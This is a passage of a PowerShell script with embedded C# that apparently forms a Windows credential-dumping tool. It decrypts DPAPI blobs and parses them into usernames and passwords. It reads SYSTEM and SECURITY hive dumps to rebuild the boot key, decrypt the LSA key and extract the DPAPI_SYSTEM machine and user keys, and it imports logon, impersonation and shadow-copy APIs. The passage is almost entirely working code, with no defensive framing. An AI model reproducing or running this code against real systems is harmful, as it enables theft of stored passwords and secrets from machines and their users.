            elseif ($algHash -eq 32772) { # CALG_SHA1
                $ipad = New-Object byte[] 64
                $opad = New-Object byte[] 64
                for ($i = 0; $i -lt 64; $i++) {
                    $ipad[$i] = [Convert]::ToByte(0x36) # '6'
                    $opad[$i] = [Convert]::ToByte(0x5c) # '\'
                }
                for ($i = 0; $i -lt $keyBytes.Length; $i++) {
                    $ipad[$i] = $ipad[$i] -bxor $keyBytes[$i]
                    $opad[$i] = $opad[$i] -bxor $keyBytes[$i]
                }
                $bufferI = New-Object byte[] ($ipad.Length + $saltBytes.Length)
                [Buffer]::BlockCopy($ipad, 0, $bufferI, 0, $ipad.Length)
                [Buffer]::BlockCopy($saltBytes, 0, $bufferI, $ipad.Length, $saltBytes.Length)
                $sha1 = New-Object Security.Cryptography.SHA1Managed
                $sha1BufferI = $sha1.ComputeHash($bufferI)
                $bufferO = New-Object byte[] ($opad.Length + $sha1BufferI.Length)
                [Buffer]::BlockCopy($opad, 0, $bufferO, 0, $opad.Length)
                [Buffer]::BlockCopy($sha1BufferI, 0, $bufferO, $opad.Length, $sha1BufferI.Length)
                $sha1Buffer0 = $sha1.ComputeHash($bufferO)

                $ipad = New-Object byte[] 64
                $opad = New-Object byte[] 64
                for ($i = 0; $i -lt 64; $i++) {
                    $ipad[$i] = [Convert]::ToByte(0x36) # '6'
                    $opad[$i] = [Convert]::ToByte(0x5c) # '\'
                }
                for ($i = 0; $i -lt $sha1Buffer0.Length; $i++) {
                    $ipad[$i] = $ipad[$i] -bxor $sha1Buffer0[$i]
                    $opad[$i] = $opad[$i] -bxor $sha1Buffer0[$i]
                }
                $sha1 = New-Object Security.Cryptography.SHA1Managed
                $ipadSHA1bytes = $sha1.ComputeHash($ipad)
                $ppadSHA1bytes = $sha1.ComputeHash($opad)
                $ret = New-Object byte[] ($ipadSHA1bytes.Length + $ppadSHA1bytes.Length)
                [Buffer]::BlockCopy($ipadSHA1bytes, 0, $ret, 0, $ipadSHA1bytes.Length)
                [Buffer]::BlockCopy($ppadSHA1bytes, 0, $ret, $ipadSHA1bytes.Length, $ppadSHA1bytes.Length)
                return $ret
            }
            else {
                return
            }
        }

        Function Local:Decrypt-Blob {
            Param (
                [byte[]]
                $Ciphertext,

                [byte[]]
                $Key,

                [int]
                $AlgCrypt,

                [Security.Cryptography.PaddingMode]
                $padding = [Security.Cryptography.PaddingMode]::Zeros
            )

            $plaintextBytes = $null
            switch ($algCrypt) {
                26115 { # CALG_3DES
                    # Decrypt the blob with 3DES
                    $desCryptoProvider = New-Object Security.Cryptography.TripleDESCryptoServiceProvider
                    $ivBytes = New-Object byte[] 8
                    $desCryptoProvider.Key = $key
                    $desCryptoProvider.IV = $ivBytes
                    $desCryptoProvider.Mode = [Security.Cryptography.CipherMode]::CBC
                    $desCryptoProvider.Padding = $padding
                    $plaintextBytes = $desCryptoProvider.CreateDecryptor().TransformFinalBlock($ciphertext, 0, $ciphertext.Length)
                }
                26128 { # CALG_AES_256
                    # Decrypt the blob with AES256
                    $aesCryptoProvider = New-Object Security.Cryptography.AesManaged
                    $ivBytes = New-Object byte[] 16
                    $aesCryptoProvider.Key = $key
                    $aesCryptoProvider.IV = $ivBytes
                    $aesCryptoProvider.Mode = [Security.Cryptography.CipherMode]::CBC
                    $aesCryptoProvider.Padding = $padding
                    $plaintextBytes = $aesCryptoProvider.CreateDecryptor().TransformFinalBlock($ciphertext, 0, $ciphertext.Length)
                }
                default {
                    Write-Warning "Could not decrypt credential blob, unsupported encryption algorithm: $algCrypt"
                }
            }
            return $plaintextBytes
        }
    }

    Process {
        $offset = $GuidOffset
        $guidMasterKeyBytes = New-Object byte[] 16
        [Array]::Copy($BlobBytes, $offset, $guidMasterKeyBytes, 0, 16)
        $guidMasterKey = New-Object Guid @(,$guidMasterKeyBytes)
        $guidString = [string] $guidMasterKey
        #Write-Verbose "guidMasterKey: $guidString"
        #Write-Verbose "size: $($BlobBytes.Length)"
        $offset += 16
        $flags = [BitConverter]::ToUInt32($BlobBytes, $offset)
        #Write-Verbose "flags: 0x$($flags.ToString("X"))"
        $offset += 4
        $descLength = [BitConverter]::ToInt32($BlobBytes, $offset)
        $offset += 4
        $description = [Text.Encoding]::Unicode.GetString($BlobBytes, $offset, $descLength)
        $offset += $descLength
        $algCrypt = [BitConverter]::ToInt32($BlobBytes, $offset)
        $offset += 4
        $algCryptLen = [BitConverter]::ToInt32($BlobBytes, $offset)
        $offset += 4
        $saltLen = [BitConverter]::ToInt32($BlobBytes, $offset)
        $offset += 4
        $saltBytes = New-Object byte[] $saltLen
        [Array]::Copy($BlobBytes, $offset, $saltBytes, 0, $saltLen)
        $offset += $saltLen
        $hmacKeyLen = [BitConverter]::ToInt32($BlobBytes, $offset)
        $offset += 4 + $hmacKeyLen
        $algHash = [BitConverter]::ToInt32($BlobBytes, $offset)
        $offset += 4
        #Write-Verbose "algHash/algCrypt: $algHash/$algCrypt"
        #Write-Verbose "description: $description"
        $algHashLen = [BitConverter]::ToInt32($BlobBytes, $offset)
        $offset += 4
        $hmac2KeyLen = [BitConverter]::ToInt32($BlobBytes, $offset)
        $offset += 4 + $hmac2KeyLen
        $dataLen = [BitConverter]::ToInt32($BlobBytes, $offset)
        $offset += 4
        $dataBytes = New-Object byte[] $dataLen
        [Array]::Copy($BlobBytes, $offset, $dataBytes, 0, $dataLen)
        if ($MasterKeys.ContainsKey($guidString)) {
            # If this key is present, decrypt this blob
            if ($algHash -eq 32782 -or $algHash -eq 32772) {
                # Convert hex string to byte array
                $masterKey = $MasterKeys[$guidString].ToString()
                $keyBytes = New-Object -TypeName byte[] -ArgumentList ($masterKey.Length / 2)
                for ($i = 0; $i -lt $masterKey.Length; $i += 2) {
                    $keyBytes[$i / 2] = [Convert]::ToByte($masterKey.Substring($i, 2), 16)
                }
                # Derive the session key
                $derivedKeyBytes = Get-DerivedKey $keyBytes $saltBytes $algHash
                $finalKeyBytes = New-Object byte[] ($algCryptLen / 8)
                [Array]::Copy($derivedKeyBytes, $finalKeyBytes, $algCryptLen / 8)
                # Decrypt the blob with the session key
                return (Decrypt-Blob -Ciphertext $DataBytes -Key $finalKeyBytes -AlgCrypt $algCrypt)
            }
            else {
                Write-Warning "Could not decrypt DPAPI blob, unsupported hash algorithm: $algHash"
            }
        }
    }

    End {}
}

Function Local:Get-CredentialBlob {
    Param (
        [byte[]]
        $DecBlobBytes
    )

    $offset = 0
    $credFlags = [BitConverter]::ToUInt32($decBlobBytes, $offset)
    $offset += 4
    $credSize = [BitConverter]::ToUInt32($decBlobBytes, $offset)
    $offset += 4
    $credUnk0 = [BitConverter]::ToUInt32($decBlobBytes, $offset)
    $offset += 4
    $type = [BitConverter]::ToUInt32($decBlobBytes, $offset)
    $offset += 4
    $flags = [BitConverter]::ToUInt32($decBlobBytes, $offset)
    $offset += 4
    $lastWritten = [long] [BitConverter]::ToInt64($decBlobBytes, $offset)
    $offset += 8
    $lastWrittenTime = New-Object DateTime
    try {
        # Check that decrypytion worked correctly
        $lastWrittenTime = [DateTime]::FromFileTime($lastWritten)
    }
    catch {
        Write-Error "Credential blob decryption failed"
        return
    }

    $unkFlagsOrSize = [BitConverter]::ToUInt32($decBlobBytes, $offset)
    $offset += 4
    $persist = [BitConverter]::ToUInt32($decBlobBytes, $offset)
    $offset += 4
    $attributeCount = [BitConverter]::ToUInt32($decBlobBytes, $offset)
    $offset += 4
    $unk0 = [BitConverter]::ToUInt32($decBlobBytes, $offset)
    $offset += 4
    $unk1 = [BitConverter]::ToUInt32($decBlobBytes, $offset)
    $offset += 4
    $targetNameLen = [BitConverter]::ToInt32($decBlobBytes, $offset)
    $offset += 4
    $targetName = [Text.Encoding]::Unicode.GetString($decBlobBytes, $offset, $targetNameLen)
    $offset += $targetNameLen
    $targetAliasLen = [BitConverter]::ToInt32($decBlobBytes, $offset)
    $offset += 4
    $targetAlias = [Text.Encoding]::Unicode.GetString($decBlobBytes, $offset, $targetAliasLen)
    $offset += $targetAliasLen
    $commentLen = [BitConverter]::ToInt32($decBlobBytes, $offset)
    $offset += 4
    $comment = [Text.Encoding]::Unicode.GetString($decBlobBytes, $offset, $commentLen)
    $offset += $commentLen
    $unkDataLen = [BitConverter]::ToInt32($decBlobBytes, $offset)
    $offset += 4
    $unkData = [Text.Encoding]::Unicode.GetString($decBlobBytes, $offset, $unkDataLen)
    $offset += $unkDataLen
    $userNameLen = [BitConverter]::ToInt32($decBlobBytes, $offset)
    $offset += 4
    $userName = [Text.Encoding]::Unicode.GetString($decBlobBytes, $offset, $userNameLen)
    $offset += $userNameLen
    $credBlobLen = [BitConverter]::ToInt32($decBlobBytes, $offset)
    $offset += 4
    $credBlobBytes = New-Object byte[] $credBlobLen
    [Array]::Copy($decBlobBytes, $offset, $credBlobBytes, 0, $credBlobLen)
    $offset += $credBlobLen
    [int] $opt = 0xffff
    try {
        $credBlob = [Text.Encoding]::Unicode.GetString($credBlobBytes)
    }
    catch {
        $credBlob = [BitConverter]::ToString($credBlobBytes).Replace("-", " ")
    }
    $cred = [ordered]@{}
    $cred["UserName"] = $userName.Trim()
    $cred["Password"] = $credBlob.Trim()
    $cred["Data"] = $unkData.Trim()
    $cred["TargetName"] = $targetName.Trim()
    $cred["TargetAlias"] = $targetAlias.Trim()
    $cred["Comment"] = $comment.Trim()
    return (New-Object PSObject -Property $cred)
}

Add-Type -TypeDefinition @'
using Microsoft.Win32.SafeHandles;
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.AccessControl;

using System.Text;
using System.Linq;
using System.Collections.Generic;
using System.Security.Cryptography;

public class Native
{
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool LogonUserA(
        string lpszUserName, 
        string lpszDomain,
        string lpszPassword,
        int dwLogonType, 
        int dwLogonProvider,
        ref IntPtr  phToken
    );

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool RevertToSelf();

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CloseHandle(IntPtr hObject);

    [StructLayout(LayoutKind.Sequential)]
    public struct IO_STATUS_BLOCK
    {
        public UInt32 Status;
        public UInt32 Information;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct NT_Trans_Data
    {
        public UInt32 NumberOfSnapShots;
        public UInt32 NumberOfSnapShotsReturned;
        public UInt32 SnapShotArraySize;
    }

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern SafeFileHandle CreateFileW(
        string lpFileName,
        FileSystemRights dwDesiredAccess,
        FileShare dwShareMode,
        IntPtr lpSecurityAttributes,
        FileMode dwCreationDisposition,
        UInt32 dwFlagsAndAttributes,
        IntPtr hTemplateFile);

    [DllImport("ntdll.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern UInt32 NtFsControlFile(
        SafeFileHandle hDevice,
        IntPtr Event,
        IntPtr ApcRoutine,
        IntPtr ApcContext,
        ref IO_STATUS_BLOCK IoStatusBlock,
        UInt32 FsControlCode,
        IntPtr InputBuffer,
        UInt32 InputBufferLength,
        IntPtr OutputBuffer,
        UInt32 OutputBufferLength);
}

public class HiveParser {
    public static List<byte[]> ParseDpapiKeys(string systempath, string securitypath)
    {
        List<byte[]> retVal = new List<byte[]>();
        byte[] bootKey = new byte[16];
        RegistryHive system = RegistryHive.ImportHiveDump(systempath);
        if (system != null)
        {
            bootKey = Registry.GetBootKey(system);
            if (bootKey == null)
            {
                return null;
            }
        }
        RegistryHive security = RegistryHive.ImportHiveDump(securitypath);
        if (security != null)
        {
            try
            {
                byte[] fVal = Registry.GetValueKey(security, @"Policy\PolEKList\Default").Data;
                LsaSecret record = new LsaSecret(fVal);
                byte[] dataVal = record.data.Take(32).ToArray();
                byte[] tempKey = Crypto.ComputeSha256(bootKey, dataVal);
                byte[] dataVal2 = record.data.Skip(32).Take(record.data.Length - 32).ToArray();
                byte[] decryptedLsaKey = Crypto.DecryptAES_ECB(dataVal2, tempKey).Skip(68).Take(32).ToArray();

                byte[] value = Registry.GetValueKey(security, @"Policy\Secrets\DPAPI_SYSTEM\CurrVal\Default").Data;
                LsaSecret record2 = new LsaSecret(value);
                byte[] tempKey2 = Crypto.ComputeSha256(decryptedLsaKey, record2.data.Take(32).ToArray());
                byte[] dataVal3 = record2.data.Skip(32).Take(record2.data.Length - 32).ToArray();
                byte[] plaintext = Crypto.DecryptAES_ECB(dataVal3, tempKey2);
                LsaSecretBlob secretBlob = new LsaSecretBlob(plaintext);
                if (secretBlob.length > 0)
                {
                    var dpapi_machinekey = secretBlob.secret.Skip(4).Take(20).ToArray();
                    retVal.Add(dpapi_machinekey);
                    var dpapi_userkey = secretBlob.secret.Skip(24).Take(20).ToArray();
                    retVal.Add(dpapi_userkey);
                }
            }
            catch (Exception e)
            {
                throw e;
            }
        }
        return retVal;
    }
}

public class RegistryHive
{
    public static RegistryHive ImportHiveDump(string dumpfileName)
    {
        if (File.Exists(dumpfileName))
        {
            using (FileStream stream = File.OpenRead(dumpfileName))
            {
                using (BinaryReader reader = new BinaryReader(stream))
                {
                    reader.BaseStream.Position += 4132 - reader.BaseStream.Position;
                    RegistryHive hive = new RegistryHive(reader);
                    return hive;
                }
            }
        }
        else
        {
            Console.WriteLine("[-] Unable to access hive dump ", dumpfileName);
            return null;
        }
    }

    public RegistryHive(BinaryReader reader)
    {
        reader.BaseStream.Position += 4132 - reader.BaseStream.Position;
        this.RootKey = new NodeKey(reader);
    }

    public string Filepath { get; set; }
    public NodeKey RootKey { get; set; }
    public bool WasExported { get; set; }
}

public class Registry
{
    private static byte[] StringToByteArray(string hex)
    {
        return Enumerable.Range(0, hex.Length)
            .Where(x => x % 2 == 0)
            .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
            .ToArray();
    }

    public static byte[] GetBootKey(RegistryHive systemHive)
    {
        ValueKey controlSet = GetValueKey(systemHive, "Select\\Default");
        int cs = BitConverter.ToInt32(controlSet.Data, 0);

        StringBuilder scrambledKey = new StringBuilder();
        foreach (string key in new string[] { "JD", "Skew1", "GBG", "Data" })
        {
            NodeKey nk = GetNodeKey(systemHive, "ControlSet00" + cs + "\\Control\\Lsa\\" + key);

            for (int i = 0; i < nk.ClassnameLength && i < 8; i++)
                scrambledKey.Append((char)nk.ClassnameData[i * 2]);
        }

        byte[] skey = StringToByteArray(scrambledKey.ToString());
        byte[] descramble = new byte[] { 0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3,
                                            0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 };

        byte[] bootkey = new byte[16];
        for (int i = 0; i < bootkey.Length; i++)
            bootkey[i] = skey[descramble[i]];

        return bootkey;
    }

    private static int Pad(int data)
    {
        if ((data & 0x3) > 0)
        {
            return (data + (data & 0x3));
        }
        else
        {
            return data;
        }
    }

    private static bool IsZeroes(byte[] inputArray)
    {
        foreach (byte b in inputArray)
        {
            if (b != 0x00)
            {
                return false;
            }
        }
        return true;
    }

    private static NodeKey GetNodeKey(RegistryHive hive, string path)
    {
        NodeKey node = null;
        string[] paths = path.Split('\\');

        foreach (string ch in paths)
        {
            bool found = false;
            if (node == null)
                node = hive.RootKey;

            foreach (NodeKey child in node.ChildNodes)
            {
                if (child.Name == ch)
                {
                    node = child;
                    found = true;
                    break;
                }
            }
            if (found == false)
            {
                return null;
            }
        }
        return node;
    }

    public static ValueKey GetValueKey(RegistryHive hive, string path)
    {
        string keyname = path.Split('\\').Last();
        path = path.Substring(0, path.LastIndexOf('\\'));

        NodeKey node = GetNodeKey(hive, path);

        return node.ChildValues.SingleOrDefault(v => v.Name == keyname);
    }
}

internal class NL_Record
{
    public NL_Record(byte[] inputData)
    {
        userLength = BitConverter.ToInt16(inputData.Take(2).ToArray(), 0);
        domainNameLength = BitConverter.ToInt16(inputData.Skip(2).Take(2).ToArray(), 0);
        dnsDomainLength = BitConverter.ToInt16(inputData.Skip(60).Take(2).ToArray(), 0);
        IV = inputData.Skip(64).Take(16).ToArray();
        encryptedData = inputData.Skip(96).Take(inputData.Length - 96).ToArray();
    }

    public int userLength { get; set; }
    public int domainNameLength { get; set; }
    public int dnsDomainLength { get; set; }
    public byte[] IV { get; set; }
    public byte[] encryptedData { get; set; }
}

public class NodeKey
{
    public NodeKey(BinaryReader hive)
    {
        ReadNodeStructure(hive);
        ReadChildrenNodes(hive);
        ReadChildValues(hive);
    }

    public List<NodeKey> ChildNodes { get; set; }
    public List<ValueKey> ChildValues { get; set; }
    public DateTime Timestamp { get; set; }
    public int ParentOffset { get; set; }
    public int SubkeysCount { get; set; }
    public int LFRecordOffset { get; set; }
    public int ClassnameOffset { get; set; }
    public int SecurityKeyOffset { get; set; }
    public int ValuesCount { get; set; }
    public int ValueListOffset { get; set; }
    public short NameLength { get; set; }
    public bool IsRootKey { get; set; }
    public short ClassnameLength { get; set; }
    public string Name { get; set; }
    public byte[] ClassnameData { get; set; }
    public NodeKey ParentNodeKey { get; set; }

    private void ReadNodeStructure(BinaryReader hive)
    {
        byte[] buf = hive.ReadBytes(4);

        if (buf[0] != 0x6e || buf[1] != 0x6b)
            throw new NotSupportedException("Bad nk header");

        long startingOffset = hive.BaseStream.Position;
        this.IsRootKey = (buf[2] == 0x2c) ? true : false;

        this.Timestamp = DateTime.FromFileTime(hive.ReadInt64());

        hive.BaseStream.Position += 4;

        this.ParentOffset = hive.ReadInt32();
        this.SubkeysCount = hive.ReadInt32();

        hive.BaseStream.Position += 4;

        this.LFRecordOffset = hive.ReadInt32();

        hive.BaseStream.Position += 4;

        this.ValuesCount = hive.ReadInt32();
        this.ValueListOffset = hive.ReadInt32();
        this.SecurityKeyOffset = hive.ReadInt32();
        this.ClassnameOffset = hive.ReadInt32();

        hive.BaseStream.Position += (startingOffset + 68) - hive.BaseStream.Position;

        this.NameLength = hive.ReadInt16();
        this.ClassnameLength = hive.ReadInt16();

        buf = hive.ReadBytes(this.NameLength);
        this.Name = System.Text.Encoding.UTF8.GetString(buf);

        hive.BaseStream.Position = this.ClassnameOffset + 4 + 4096;
        this.ClassnameData = hive.ReadBytes(this.ClassnameLength);
    }

    private void ReadChildrenNodes(BinaryReader hive)
    {
        this.ChildNodes = new List<NodeKey>();
        if (this.LFRecordOffset != -1)
        {
            hive.BaseStream.Position = 4096 + this.LFRecordOffset + 4;

            byte[] buf = hive.ReadBytes(2);

            //ri
            if (buf[0] == 0x72 && buf[1] == 0x69)
            {
                int count = hive.ReadInt16();

                for (int i = 0; i < count; i++)
                {
                    long pos = hive.BaseStream.Position;
                    int offset = hive.ReadInt32();
                    hive.BaseStream.Position = 4096 + offset + 4;
                    buf = hive.ReadBytes(2);

                    if (!(buf[0] == 0x6c && (buf[1] == 0x66 || buf[1] == 0x68)))
                        throw new Exception("Bad LF/LH record at: " + hive.BaseStream.Position);

                    ParseChildNodes(hive);

                    hive.BaseStream.Position = pos + 4; //go to next record list
                }
            }
            //lf or lh
            else if (buf[0] == 0x6c && (buf[1] == 0x66 || buf[1] == 0x68))
                ParseChildNodes(hive);
            else
                throw new Exception("Bad LF/LH/RI Record at: " + hive.BaseStream.Position);
        }
    }

    private void ParseChildNodes(BinaryReader hive)
    {
        int count = hive.ReadInt16();
        long topOfList = hive.BaseStream.Position;

        for (int i = 0; i < count; i++)
        {
            hive.BaseStream.Position = topOfList + (i * 8);
            int newoffset = hive.ReadInt32();
            hive.BaseStream.Position += 4;
            //byte[] check = hive.ReadBytes(4);
            hive.BaseStream.Position = 4096 + newoffset + 4;
            NodeKey nk = new NodeKey(hive) { ParentNodeKey = this };
            this.ChildNodes.Add(nk);
        }

        hive.BaseStream.Position = topOfList + (count * 8);
    }

    private void ReadChildValues(BinaryReader hive)
    {
        this.ChildValues = new List<ValueKey>();
        if (this.ValueListOffset != -1)
        {
            hive.BaseStream.Position = 4096 + this.ValueListOffset + 4;

            for (int i = 0; i < this.ValuesCount; i++)
            {
                hive.BaseStream.Position = 4096 + this.ValueListOffset + 4 + (i * 4);
                int offset = hive.ReadInt32();
                hive.BaseStream.Position = 4096 + offset + 4;
                this.ChildValues.Add(new ValueKey(hive));
            }
        }
    }

    public byte[] getChildValues(string valueName)
    {
        ValueKey targetData = this.ChildValues.Find(x => x.Name.Contains(valueName));
        return targetData.Data;
    }
}

public class ValueKey
{
    public ValueKey(BinaryReader hive)
    {
        byte[] buf = hive.ReadBytes(2);

        if (buf[0] != 0x76 && buf[1] != 0x6b)
            throw new NotSupportedException("Bad vk header");

        this.NameLength = hive.ReadInt16();
        this.DataLength = hive.ReadInt32();

        byte[] databuf = hive.ReadBytes(4);

        this.ValueType = hive.ReadInt32();
        hive.BaseStream.Position += 4;

        buf = hive.ReadBytes(this.NameLength);
        this.Name = (this.NameLength == 0) ? "Default" : System.Text.Encoding.UTF8.GetString(buf);

        if (this.DataLength < 5)
            this.Data = databuf;
        else
        {
            hive.BaseStream.Position = 4096 + BitConverter.ToInt32(databuf, 0) + 4;
            this.Data = hive.ReadBytes(this.DataLength);
        }
    }

    public short NameLength { get; set; }
    public int DataLength { get; set; }
    public int DataOffset { get; set; }
    public int ValueType { get; set; }
    public string Name { get; set; }
    public byte[] Data { get; set; }
    public string String { get; set; }
}

internal class LsaSecret
{
    public LsaSecret(byte[] inputData)
    {
        version = inputData.Take(4).ToArray();
        enc_key_id = inputData.Skip(4).Take(16).ToArray();
        enc_algo = inputData.Skip(20).Take(4).ToArray();
        flags = inputData.Skip(24).Take(4).ToArray();
        data = inputData.Skip(28).ToArray();
    }

    public byte[] version { get; set; }
    public byte[] enc_key_id { get; set; }
    public byte[] enc_algo { get; set; }
    public byte[] flags { get; set; }
    public byte[] data { get; set; }
}

internal class LsaSecretBlob
{
    public LsaSecretBlob(byte[] inputData)
    {
        length = BitConverter.ToInt16(inputData.Take(4).ToArray(), 0);
        unk = inputData.Skip(4).Take(12).ToArray();
        secret = inputData.Skip(16).Take(length).ToArray();
    }

    public int length { get; set; }
    public byte[] unk { get; set; }
    public byte[] secret { get; set; }
}

internal static class Crypto
{
    //https://stackoverflow.com/questions/28613831/encrypt-decrypt-querystring-values-using-aes-256
    public static byte[] DecryptAES_ECB(byte[] value, byte[] key)
    {
        AesCryptoServiceProvider aes = new AesCryptoServiceProvider();
        aes.BlockSize = 128;
        aes.Key = key;
        aes.Mode = CipherMode.ECB;
        aes.Padding = PaddingMode.None;
        using (ICryptoTransform decrypt = aes.CreateDecryptor())
        {
            byte[] dest = decrypt.TransformFinalBlock(value, 0, value.Length);
            return dest;
        }
    }

    public static byte[] ComputeSha256(byte[] key, byte[] value)
    {
        MemoryStream memStream = new MemoryStream();
        memStream.Write(key, 0, key.Length);
        for (int i = 0; i < 1000; i++)
        {
            memStream.Write(value, 0, 32);
        }
        byte[] shaBase = memStream.ToArray();
        using (SHA256 sha256Hash = SHA256.Create())
        {
            byte[] newSha = sha256Hash.ComputeHash(shaBase);
            return newSha;
        }
    }
}

public class Pbkdf2 {
    public Pbkdf2(HMAC algorithm, Byte[] password, Byte[] salt, Int32 iterations) {
        if (algorithm == null) { throw new ArgumentNullException("algorithm", "Algorithm cannot be null."); }
        if (salt == null) { throw new ArgumentNullException("salt", "Salt cannot be null."); }
        if (password == null) { throw new ArgumentNullException("password", "Password cannot be null."); }
        this.Algorithm = algorithm;
        this.Algorithm.Key = password;
        this.Salt = salt;
        this.IterationCount = iterations;
        this.BlockSize = this.Algorithm.HashSize / 8;
        this.BufferBytes = new byte[this.BlockSize];
    }
    private readonly int BlockSize;
    private uint BlockIndex = 1;
    private byte[] BufferBytes;
    private int BufferStartIndex = 0;
    private int BufferEndIndex = 0;
    public HMAC Algorithm { get; private set; }
    public Byte[] Salt { get; private set; }
    public Int32 IterationCount { get; private set; }
    public Byte[] GetBytes(int count, string algorithm = "sha512") {
        byte[] result = new byte[count];
        int resultOffset = 0;
        int bufferCount = this.BufferEndIndex - this.BufferStartIndex;

        if (bufferCount > 0) { //if there is some data in buffer
            if (count < bufferCount) { //if there is enough data in buffer
                Buffer.BlockCopy(this.BufferBytes, this.BufferStartIndex, result, 0, count);
                this.BufferStartIndex += count;
                return result;
            }
            Buffer.BlockCopy(this.BufferBytes, this.BufferStartIndex, result, 0, bufferCount);
            this.BufferStartIndex = this.BufferEndIndex = 0;
            resultOffset += bufferCount;
        }
        while (resultOffset < count) {
            int needCount = count - resultOffset;
            if (algorithm.ToLower() == "sha256")
                this.BufferBytes = this.Func(false);
            else
                this.BufferBytes = this.Func();
            if (needCount > this.BlockSize) { //we one (or more) additional passes
                Buffer.BlockCopy(this.BufferBytes, 0, result, resultOffset, this.BlockSize);
                resultOffset += this.BlockSize;
            } else {
                Buffer.BlockCopy(this.BufferBytes, 0, result, resultOffset, needCount);
                this.BufferStartIndex = needCount;
                this.BufferEndIndex = this.BlockSize;
                return result;
            }
        }
        return result;
    }
    private byte[] Func(bool mscrypto = true) {
        var hash1Input = new byte[this.Salt.Length + 4];
        Buffer.BlockCopy(this.Salt, 0, hash1Input, 0, this.Salt.Length);
        Buffer.BlockCopy(GetBytesFromInt(this.BlockIndex), 0, hash1Input, this.Salt.Length, 4);
        var hash1 = this.Algorithm.ComputeHash(hash1Input);
        byte[] finalHash = hash1;
        for (int i = 2; i <= this.IterationCount; i++) {
            hash1 = this.Algorithm.ComputeHash(hash1, 0, hash1.Length);
            for (int j = 0; j < this.BlockSize; j++) {
                finalHash[j] = (byte)(finalHash[j] ^ hash1[j]);
            }
            if (mscrypto)
                Array.Copy(finalHash, hash1, hash1.Length);
        }
        if (this.BlockIndex == uint.MaxValue) { throw new InvalidOperationException("Derived key too long."); }
        this.BlockIndex += 1;
        return finalHash;
    }
    private static byte[] GetBytesFromInt(uint i) {
        var bytes = BitConverter.GetBytes(i);
        if (BitConverter.IsLittleEndian) {
            return new byte[] { bytes[3], bytes[2], bytes[1], bytes[0] };
        } else {
            return bytes;
        }
    }
}
'@
